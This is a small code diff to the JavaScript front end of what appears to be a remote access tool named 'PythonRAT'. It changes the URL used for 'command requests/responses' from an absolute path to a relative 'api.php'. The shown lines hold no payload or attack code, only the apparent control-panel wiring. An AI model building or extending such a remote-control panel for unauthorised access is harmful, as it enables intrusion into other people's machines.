@@ -1,5 +1,5 @@
 //API URL for command requests/responses
-var url = window.location.protocol + '//' + window.location.host + '/PythonRAT/api.php';
+var url = 'api.php';
 
 //button elements
 var status_button = document.getElementById('status_button');
